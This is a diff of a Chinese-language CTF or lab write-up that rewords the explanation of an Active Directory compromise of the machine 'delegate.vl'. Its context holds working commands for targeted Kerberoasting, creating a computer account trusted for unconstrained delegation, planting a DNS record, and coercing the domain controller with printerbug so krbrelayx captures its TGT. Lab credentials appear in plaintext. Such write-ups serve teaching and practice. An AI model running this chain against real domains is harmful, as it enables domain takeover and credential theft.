@@ -67,7 +67,7 @@ delegate.vl\A.Briggs:P4ssw0rd1#123
 
 ### 0x02 横向：GenericWrite 换一张可爆破的票
 
-BloodHound 第一条边就够用：`A.Briggs` 对 `N.Thompson` 有 `GenericWrite`，可写 `servicePrincipalName`，直接上 Targeted Kerberoasting。
+BloodHound 里这条边就够用：`A.Briggs` 对 `N.Thompson` 有 `GenericWrite`，可写 `servicePrincipalName`，直接上 Targeted Kerberoasting。
 
 ```bash
 targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
@@ -95,7 +95,7 @@ SeMachineAccountPrivilege     Add workstations to domain
 SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation
 ```
 
-`SeEnableDelegationPrivilege` 是这台靶机唯一真正非常规的地方：是否可信任委派这个开关默认只有域管能拨，这里却下放给了一个普通域用户。配合 `SeMachineAccountPrivilege` 能凭空造账户，两个权限凑齐，我就能自己造一台机器并把它设成可信任非约束委派。这种组合在真实环境里几乎见不到。
+`SeEnableDelegationPrivilege` 是这台靶机唯一真正非常规的地方：这个"是否信任委派"的属性，默认只有域管能改，这里却下放给了一个普通域用户。配合 `SeMachineAccountPrivilege` 能凭空造账户，两个权限凑齐，我就能自己造一台机器并把它设成非约束委派。这种组合在真实环境里几乎见不到。
 
 ### 0x04 提权：自造非约束委派机器，强制 DC1 认证抓 TGT
 
@@ -103,9 +103,9 @@ SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted fo
 
 ![非约束委派抓取 TGT 原理](unconstrained-delegation.png)
 
-非约束委派机器会缓存任何向它认证者的 TGT。造一台这样的机器，用 `printerbug` 强制 `DC1` 来认证，`DC1$` 的 TGT 就落进它的缓存，我控制这台机器就能直接读走。
+非约束委派机器会缓存所有向它认证的账户的 TGT。把 `DELEGATE$` 设成非约束委派后，`printerbug` 强制 `DC1` 认证它，`DC1$` 的 TGT 就落进它的缓存，我控制这台机器，直接从缓存里把票拿走。
 
-动手部分是一条紧耦合的链。先造机器账户 `DELEGATE$`，给它拨上 `TRUSTED_FOR_DELEGATION`：
+接下来这几步环环相扣，前一步没做成，后面就走不下去。先造机器账户 `DELEGATE$`，给它加上 `TRUSTED_FOR_DELEGATION`：
 
 ```bash
 impacket-addcomputer -computer-name 'DELEGATE$' -computer-pass 'Password123!' \
@@ -115,7 +115,7 @@ bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl \
   add uac 'DELEGATE$' -f TRUSTED_FOR_DELEGATION
 ```
 
-`DC1` 认证时得能解析到我，所以给 `DELEGATE$` 挂一个受控主机名（写进 `msDS-AdditionalDnsHostName`），再往域内 DNS 加一条指向攻击机的 A 记录。DNS 记录写下去不是立刻生效，等约 3 分钟：
+前提是 `DC1` 认证时能解析到我，所以给 `DELEGATE$` 挂一个受控主机名（写进 `msDS-AdditionalDnsHostName`），再往域内 DNS 加一条指向攻击机的 A 记录。DNS 记录写下去不是立刻生效，等约 3 分钟：
 
 ```bash
 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' \
@@ -127,13 +127,13 @@ dnstool.py -u 'delegate.vl\DELEGATE$' -p 'Password123!' \
 nslookup DELEGATE.delegate.vl 10.129.174.10
 ```
 
-记录生效后起 `krbrelayx` 监听。这里用 `krbrelayx` 而不是 `ntlmrelayx`，因为要接的是转发过来的 Kerberos TGT，落到 ccache。它需要 `DELEGATE$` 的 Kerberos 密钥来解票，喂盐值和口令让它自己算（`krbsalt` 的 realm 部分大写）：
+记录生效后起 `krbrelayx` 监听。这里用 `krbrelayx` 而不是 `ntlmrelayx`，因为要接的是转发过来的 Kerberos TGT，落到 ccache。它需要 `DELEGATE$` 的 Kerberos 密钥来解票，给它盐值和口令让它自己算（`krbsalt` 的 realm 部分大写）：
 
 ```bash
 krbrelayx.py --krbsalt 'DELEGATE.VLhost/delegate.delegate.vl' --krbpass 'Password123!'
 ```
 
-监听起好，`printerbug` 强制 `DC1` 向我的主机名发起认证：
+监听跑起来后，`printerbug` 强制 `DC1` 向我的主机名发起认证：
 
 ```bash
 printerbug.py delegate.vl/'N.Thompson':'KALEB_2341'@'dc1.delegate.vl' 'DELEGATE.delegate.vl'
